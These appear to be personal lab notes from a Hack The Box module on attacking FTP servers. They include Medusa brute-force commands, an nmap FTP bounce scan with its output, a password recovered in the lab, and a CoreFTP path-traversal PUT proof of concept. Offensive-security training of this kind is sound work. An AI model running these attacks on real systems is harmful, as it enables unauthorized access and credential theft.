
-network protocol, for transfer files between computers
-TCP
-`anonymous`  -u
-get or mget for multy file downloads

#### Brute Forcing with Medusa
```shell-session
AhmaDb0x@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```
#### bounce back attack
```shell-session
AhmaDb0x@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http
```


```bash
medusa -U users.list -P passwords.list -h 10.129.251.175 -M ftp -n 2121

```


robin Password: 7iz4rnckjsduza7

```bash
┌──(pwn㉿kali)-[~]
└─$ medusa -u robin -P passwords.list -h 10.129.251.175 -M ftp -n 2121 -t 10 -f > ftp_credentials.txt 2>&1

```

# Latest FTP Vulnerabilities
#### CoreFTP Exploitation

```shell-session
AhmaDb0x@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

